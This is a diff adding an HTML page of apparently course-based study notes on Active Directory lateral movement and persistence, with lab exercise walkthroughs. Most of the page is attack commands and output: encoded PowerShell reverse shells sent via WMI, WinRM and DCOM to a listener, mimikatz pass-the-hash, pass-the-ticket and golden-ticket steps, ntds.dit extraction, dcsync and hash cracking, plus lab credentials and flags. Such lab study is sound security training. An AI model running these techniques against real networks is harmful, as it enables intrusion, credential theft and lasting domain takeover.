@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>AD Lateral Movement & Persistence - AD Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+        <a href="windows_privesc.html">Windows PrivEsc</a>
+        <a href="linux-privesc.html">Linux Privesc</a>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+    </nav>
+
+    <div class="container">
+
+        <h1>Active Directory Lateral Movement Techniques</h1>
+
+        <div class="section">
+            <div class="section-header">WMI and WinRM (Windows)</div>
+            <div class="section-content">
+
+                <p>Running the wmic utility to spawn a process on a remote system.</p>
+                <pre><code>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"</code></pre>
+
+                <p>From powershell</p>
+                <pre><code>$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+$command = 'calc';
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+</code></pre>
+
+                <p>(After checking the process was created OK)</p>
+
+                <p>We can craft a revershell</p>
+                <pre><code>//python revershell</code></pre>
+
+                <p>First, we encode the reverse shell</p>
+                <pre><code>kali@kali:~$ python3 encode.py
+powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
+OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+</code></pre>
+
+                <p>Then we run the script</p>
+                <pre><code>PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
+PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+
+PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+
+PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+ProcessId ReturnValue PSComputerName
+--------- ----------- --------------
+     3948           0 192.168.50.73
+</code></pre>
+
+                <p>Here we got a revershell.</p>
+
+                <p>As an alternative, we can use WinRM</p>
+                <pre><code>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+
+FILES04
+corp\jen
+#We can confirm that we are running commands remotely on FILES04 server because we see the output
+</code></pre>
+
+                <p>Full lateral movement scenario using encoded reverse shell</p>
+                <pre><code>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+</code></pre>
+
+                <p>In our kali</p>
+                <pre><code>kali@kali:~$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
+PS C:\Users\jen> hostname
+FILES04
+PS C:\Users\jen> whoami
+corp\jen
+</code></pre>
+
+                <p>PowerShell remoting via <em>New-PSSession</em></p>
+                <pre><code>PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
+</code></pre>
+
+                <pre><code>PS C:\Users\jeff> Enter-PSSession 1
+[192.168.50.73]: PS C:\Users\jen\Documents> whoami
+corp\jen
+
+[192.168.50.73]: PS C:\Users\jen\Documents> hostname
+FILES04
+</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">PsExec (Windows)</div>
+            <div class="section-content">
+                <p>To execute the command remotely, PsExec performs the following tasks:</p>
+                <ul>
+                    <li>Writes <b>psexesvc.exe</b> into the <b>C:\Windows</b> directory</li>
+                    <li>Creates and spawns a service on the remote host</li>
+                    <li>Runs the requested program/command as a child process of psexesvc.exe</li>
+                </ul>
+
+                <p>Start a new interactive session on the remote host</p>
+                <pre><code>.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd</code></pre>
+            </div>
+
+        </div>
+        <div class="section">
+            <div class="section-header">PsExec (Linux)</div>
+            <div class="section-content">
+
+                <pre><code>impacket-psexec corp/jen:'Nexus123!'@192.168.184.73/code></pre>
+            </div>
+        </div>
+        <div class="section">
+            <div class="section-header">Pass the Hash (Kali)</div>
+            <div class="section-content">
+                <p>Authenticate using hashes instead of plain text passwords</p>
+                <pre><code>kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73</code></pre>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">Overpass the Hash (Windows)</div>
+            <div class="section-content">
+                <p>Get cached credentials and create a process with a different user's NTLM hash</p>
+                <pre><code>mimikatz # sekurlsa::logonpasswords
+
+...
+Authentication Id : 0 ; 1142030 (00000000:00116d0e)
+Session           : Interactive from 0
+User Name         : jen
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 2/27/2023 7:43:20 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1124
+        msv :
+         [00000003] Primary
+         * Username : jen
+         * Domain   : CORP
+         * NTLM     : 369def79d8372408bf6e93364cc93075
+</code></pre>
+
+                <pre><code>mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</code></pre>
+
+                <p>Generate TGT via network share</p>
+                <pre><code>PS C:\Windows\system32> net use \\files04
+PS C:\Windows\system32> klist</code></pre>
+
+                <p>Run PsExec remotely as jen</p>
+                <pre><code>PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
+
+C:\Windows\system32>whoami
+corp\jen
+
+C:\Windows\system32>hostname
+FILES04
+</code></pre>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">Pass the Ticket</div>
+            <div class="section-content">
+                <pre><code>PS C:\Windows\system32> whoami
+corp\jen
+PS C:\Windows\system32> ls \\web04\backup
+ls : Access to the path '\\web04\backup' is denied.
+...
+</code></pre>
+
+                <pre><code>mimikatz #sekurlsa::tickets /export
+       [...]
+           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
+</code></pre>
+
+                <pre><code>mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+PS C:\Tools> klist
+PS C:\Tools> ls \\web04\backup
+-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
+</code></pre>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">DCOM</div>
+            <div class="section-content">
+                <pre><code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+</code></pre>
+
+                <pre><code>kali@kali:~$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
+PS C:\Windows\system32> whoami
+corp\jen
+PS C:\Windows\system32> hostname
+FILES04
+</code></pre>
+            </div>
+        </div>
+
+        <h1>AD Persistence</h1>
+
+        <div class="section">
+            <div class="section-header">Golden Ticket</div>
+            <div class="section-content">
+                <p>We will try to move from CLIENT74 to the domain controller.</p>
+                <pre><code>C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe
+
+Couldn't access DC1:
+Access is denied.
+</code></pre>
+
+                <p>The golden ticket will require us to have access to a Domain Admin's group account or to have
+                    compromised the domain controller itself.</p>
+
+                <p>With this kind of access, we can extract the password hash of the <em>krbtgt</em> account with
+                    Mimikatz.</p>
+
+                <p>On Domain Controller</p>
+                <pre><code>mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 1693c6cefafffc7af11ef34d1c788f47
+</code></pre>
+
+                <p>On CLIENT74, delete any existing Kerberos tickets</p>
+                <pre><code>mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+</code></pre>
+
+                <p>Create the golden ticket</p>
+                <pre><code>mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+User      : jen
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500    
+Groups Id : *513 512 520 518 519
+ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
+Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'jen @ corp.com' successfully submitted for current session
+
+mimikatz # misc::cmd
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
+</code></pre>
+
+                <p>Run PsExec with the spawned shell</p>
+                <pre><code>C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
+
+C:\Windows\system32>ipconfig
+
+Windows IP Configuration
+</code></pre>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">Shadow Copies</div>
+            <div class="section-content">
+                <p>Abuse vshadow to create a shadow copy and extract AD database</p>
+                <pre><code>C:\Tools>vshadow.exe -nw -p  C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+</code></pre>
+            </div>
+        </div>
+
+        <h1>Ejercicios</h1>
+
+        <div class="section">
+            <div class="section-header">Exercises</div>
+            <div class="section-content">
+
+                <div class="sub-section">
+                    <div class="sub-section-header">1 PsExec</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Start VM Group 2 and connect as the <i>offsec</i> user on client74. Then try to use PsExec
+                            to move laterally to web04 in order to get the flag located on jen's desktop.
+                        </p>
+
+                        <p>
+                            For this scenario, let's assume we have RDP access as the <i>offsec</i> local administrator
+                            on CLIENT74 as we already discovered its clear-text password (lab) on FILES04.
+                        </p>
+
+                        <p><b>Windows</b></p>
+                        <pre><code>xfreerdp3 /u:offsec /p:lab /v:192.168.233.74</code></pre>
+
+                        <p>First lets identify web04 IP</p>
+                        <pre><code>C:\Windows\system32&gt;ping web04
+
+Pinging web04.corp.com [192.168.233.72] with 32 bytes of data:</code></pre>
+
+                        <p>Then lets search for PsExec</p>
+                        <pre><code>PS C:\Tools&gt; Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "PsExec" }
+Directory: C:\Tools\SysinternalsSuite</code></pre>
+
+                        <p>Then lets use it</p>
+                        <pre><code>.\PsExec64.exe -i \\192.168.233.72 -u corp\jen -p Nexus123! cmd
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.20348.887]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+corp\jen
+
+C:\Users\jen\Desktop&gt;type flag.txt
+OS{d8853d00b5877ea2f4517f978486c949}</code></pre>
+
+                        <p><b>Linux</b></p>
+                        <pre><code>impacket-psexec corp/jen:'Nexus123!'@192.168.233.72
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC
+
+[*] Requesting shares on 192.168.233.72.....
+[*] Found writable share ADMIN$
+[*] Uploading file noSnublU.exe
+[*] Opening SVCManager on 192.168.233.72.....
+[*] Creating service xBeg on 192.168.233.72.....
+[*] Starting service xBeg.....
+
+C:\Windows\system32&gt;whoami
+nt authority\system</code></pre>
+
+                    </div>
+                </div>
+
+
+                <div class="sub-section">
+                    <div class="sub-section-header">2 Pass the Hash</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Start VM Group 2 and try to execute the pass the hash technique to move laterally to web04
+                            to get the flag located on the administrator's desktop.
+                        </p>
+
+                        <p>We suppose that we got the hash in a previous step.</p>
+
+                        <pre><code>impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.233.72
+
+C:\Users\Administrator\Desktop&gt;type flag.txt
+OS{f450e903b4bf032b793f1075af6d2519}</code></pre>
+
+                    </div>
+                </div>
+
+
+                <div class="sub-section">
+                    <div class="sub-section-header">3 Overpass the Hash</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Start VM Group 2 and try to execute the overpass the hash technique to move laterally to
+                            web04
+                            to get the flag located on the Administrator's desktop.
+                        </p>
+
+                        <p>
+                            To do so, connect to CLIENT76 via RDP as the <i>offsec</i> user and use the NTLM hash
+                            obtained
+                            in a previous module.
+                        </p>
+
+                        <pre><code>xfreerdp3 /u:offsec /p:lab /v:192.168.233.76</code></pre>
+
+                        <p>We run mimikatz to get a shell as jen</p>
+                        <pre><code>privilege::debug
+
+sekurlsa::logonpasswords
+
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</code></pre>
+
+                        <p>Then, in that shell we create a ticket</p>
+                        <pre><code>PS C:\Users\Administrator\Desktop&gt; klist
+
+Current LogonId is 0:0x168e26
+
+Cached Tickets: (0)
+
+PS C:\Users\Administrator\Desktop&gt; net use \\web04
+The command completed successfully.
+
+PS C:\Users\Administrator\Desktop&gt; klist
+
+Current LogonId is 0:0x168e26
+
+Cached Tickets: (2)</code></pre>
+
+                        <pre><code>PS C:\Tools\SysinternalsSuite&gt; .\PsExec.exe \\web04 cmd
+
+Directory of C:\Users\Administrator\Desktop
+
+01/20/2026  07:00 AM    &lt;DIR&gt;          .
+11/17/2025  12:23 AM    &lt;DIR&gt;          ..
+01/20/2026  07:00 AM                78 flag.txt
+
+C:\Users\Administrator\Desktop&gt;type flag.txt
+OS{1d4a56ab4fab0312fdad36906b907392}</code></pre>
+
+                    </div>
+                </div>
+
+                <div class="sub-section">
+                    <div class="sub-section-header">4 Pass the Ticket</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Start VM Group 1 and try to execute the pass the ticket technique as illustrated in this
+                            section by first logging in to CLIENT76 as <i>jen</i>. Try to move laterally to web04 to get
+                            the flag located in the shared folder.
+                        </p>
+
+                        <pre><code>xfreerdp3 /u:jen /p:Nexus123! /v:192.168.233.76</code></pre>
+
+                        <p>Lets check that we dont have access to the share</p>
+                        <pre><code>PS C:\Windows\system32&gt; ls \\web04\backup
+ls : Access to the path '\\web04\backup' is denied.</code></pre>
+
+                        <p>Now we will run mimikatz and export all the TGT/TGS from memory</p>
+                        <pre><code>sekurlsa::tickets /export</code></pre>
+
+                        <p>
+                            Inspecting the generated tickets indicates that <i>dave</i> had initiated a session.
+                            We can try to inject one of their tickets inside <i>jen</i>'s session.
+                        </p>
+
+                        <pre><code>PS C:\Tools&gt; dir *.kirbi
+
+Directory: C:\Tools
+
+-a---- [0;192d38]-0-0-40810000-dave@cifs-web04.kirbi</code></pre>
+
+                        <p>
+                            We inject one of the <b>dave@cifs-web04.kirbi</b> tickets using mimikatz.
+                        </p>
+
+                        <pre><code>mimikatz # kerberos::ptt [0;192d38]-0-0-40810000-dave@cifs-web04.kirbi</code></pre>
+
+                        <p>Now we have the ticket</p>
+                        <pre><code>PS C:\Tools&gt; klist
+
+Client: dave @ CORP.COM
+Server: cifs/web04 @ CORP.COM</code></pre>
+
+                        <p>Now lets try to connect to the share</p>
+                        <pre><code>ls \\web04\backup
+
+PS C:\Tools&gt; type \\web04\backup\flag.txt
+OS{91cc447b8ab4c164a367320461964f89}</code></pre>
+
+                    </div>
+                </div>
+
+
+                <div class="sub-section">
+                    <div class="sub-section-header">5 DCOM</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Start VM Group 2 and connect as the <i>jen</i> user on client74 then try to abuse DCOM to
+                            move laterally to web04 to get the flag located on the administrator's desktop.
+                        </p>
+
+                        <pre><code>xfreerdp3 /u:jen /p:Nexus123! /v:192.168.233.74</code></pre>
+
+                        <p>Now lets connect to web04</p>
+                        <pre><code>$dcom = [System.Activator]::CreateInstance(
+[type]::GetTypeFromProgID("MMC20.Application.1","192.168.233.72"))</code></pre>
+
+                        <pre><code>$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e ...","7")</code></pre>
+
+                        <p>On our Kali machine</p>
+                        <pre><code>nc -nlvp 443
+
+whoami
+corp\jen</code></pre>
+
+                        <pre><code>PS C:\Users\Administrator\Desktop&gt; type flag.txt
+OS{72c55e069d2d0714075b2ef1f4a3754a}</code></pre>
+
+                    </div>
+                </div>
+
+
+                <div class="sub-section">
+                    <div class="sub-section-header">6 Persistence Golden Ticket</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Start VM Group 2 and try to execute the golden ticket persistence technique to get access
+                            to DC1 and retrieve the flag located on the administrator's desktop.
+                        </p>
+
+                        <pre><code>xfreerdp3 /u:jen /p:Nexus123! /v:192.168.144.74</code></pre>
+
+                        <p>At first, we cant access DC1</p>
+                        <pre><code>PS C:\Tools\SysinternalsSuite&gt; .\PsExec64.exe \\DC1 cmd.exe
+Access is denied.</code></pre>
+
+                        <p>We will get the krbtgt hash</p>
+                        <pre><code>mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+
+User : krbtgt
+NTLM : 1693c6cefafffc7af11ef34d1c788f47</code></pre>
+
+                        <pre><code>kerberos::purge
+
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt</code></pre>
+
+                        <p>A new command prompt will spawn</p>
+                        <pre><code>PsExec64.exe \\dc1.corp.com cmd.exe</code></pre>
+
+                        <pre><code>C:\Users\Administrator\Desktop&gt;type flag.txt
+OS{41755b63bae7819675345f3c1aab54b6}</code></pre>
+
+                    </div>
+                </div>
+
+                <div class="sub-section">
+                    <div class="sub-section-header">7 Capstone 1</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Start VM Group 2 and try to execute the dcsync technique and get access to DC1 in order to
+                            retrieve the flag located on the administrator's desktop. To do so, log in via RDP as
+                            <i>jeffadmin</i> and perform dcsync against the domain <i>Administrator</i> user to obtain
+                            its NTLM hash.
+                        </p>
+
+                        <pre><code>xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.230.75</code></pre>
+
+                        <p>We will try from our Kali machine</p>
+                        <pre><code>impacket-secretsdump -just-dc-user Administrator corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.144.70
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e</code></pre>
+
+                        <p><b>Password hash:</b> 2892d26cdf84d7a70e2eb3b9f05c425e</p>
+
+                        <p>Now lets crack it</p>
+                        <pre><code>echo "2892d26cdf84d7a70e2eb3b9f05c425e" &gt; hashhh
+
+hashcat -m 1000 hashhh /usr/share/wordlists/rockyou.txt -r simple.rule --force
+
+2892d26cdf84d7a70e2eb3b9f05c425e:lab</code></pre>
+
+                        <pre><code>impacket-psexec corp.com/Administrator:'lab'@192.168.144.70
+
+C:\Users\Administrator\Desktop&gt; type flag.txt
+OS{99a81398d89f6c151c865e577293641a}</code></pre>
+
+                        <p><b>Alternative</b></p>
+                        <pre><code>evil-winrm -i 192.168.144.70 -u Administrator -p 'lab'</code></pre>
+
+                    </div>
+                </div>
+
+
+                <div class="sub-section">
+                    <div class="sub-section-header">8 Capstone 2</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            <b>Capstone Exercise:</b> Once VM Group 3 is started, the domain <i>corp.com</i> has been
+                            modified. Log in as <i>leon</i> on CLIENT74 and use the techniques discussed in this module
+                            to move laterally and get the flag on FILES04 Administrator's desktop.
+                        </p>
+
+                        <p>We will start as jen</p>
+                        <pre><code>xfreerdp3 /u:jen /p:Nexus123! /v:192.168.184.74</code></pre>
+
+                        <p>We see that leon is there, this is our objective</p>
+                        <pre><code>PS C:\Tools&gt; net user /domain
+
+User accounts for \\DC1.corp.com
+
+Administrator  dave  jeff  jeffadmin  jen  leon</code></pre>
+
+                        <p>I couldn't find anything useful initially</p>
+                        <pre><code>hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r best64.rule --force
+
+Flowers1</code></pre>
+
+                        <p>We login via PsExec</p>
+                        <pre><code>impacket-psexec corp/jen:'Nexus123!'@192.168.184.73</code></pre>
+
+                        <pre><code>C:\Users\Administrator\Desktop&gt; type proof.txt
+OS{5f287d927ca1c013a0220a65968690ce}</code></pre>
+
+                    </div>
+                </div>
+
+
+                <div class="sub-section">
+                    <div class="sub-section-header">9 Capstone 3</div>
+                    <div class="sub-section-content">
+
+                        <p>
+                            Once VM Group 4 is started, the domain <i>corp.com</i> has been modified. Log in as the
+                            <i>leon</i> user on CLIENT76 and use the techniques discussed in this module to move
+                            laterally and get the flag in the WEB04 shared folder.
+                        </p>
+
+                        <pre><code>xfreerdp3 /u:jen /p:Nexus123! /v:192.168.184.76</code></pre>
+
+                        <p>We will use pass the ticket</p>
+                        <pre><code>privilege::debug
+sekurlsa::tickets /export</code></pre>
+
+                        <pre><code>kerberos::ptt [0;273451]-0-0-40810000-dave@cifs-web04.kirbi</code></pre>
+
+                        <pre><code>PS C:\Tools&gt; klist
+
+Client: dave @ CORP.COM
+Server: cifs/web04 @ CORP.COM</code></pre>
+
+                        <pre><code>PS C:\Tools&gt; ls \\web04\backup</code></pre>
+
+                        <pre><code>PS C:\Tools&gt; type \\web04\backup\proof.txt
+OS{35e1ce1a01dc3236faae1aad1afb0a68}</code></pre>
+
+                    </div>
+                </div>
+
+
+            </div>
+        </div>
+
+    </div>
+
+
+
+    <script>
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        })
+    </script>
+
+</body>
+
+</html>
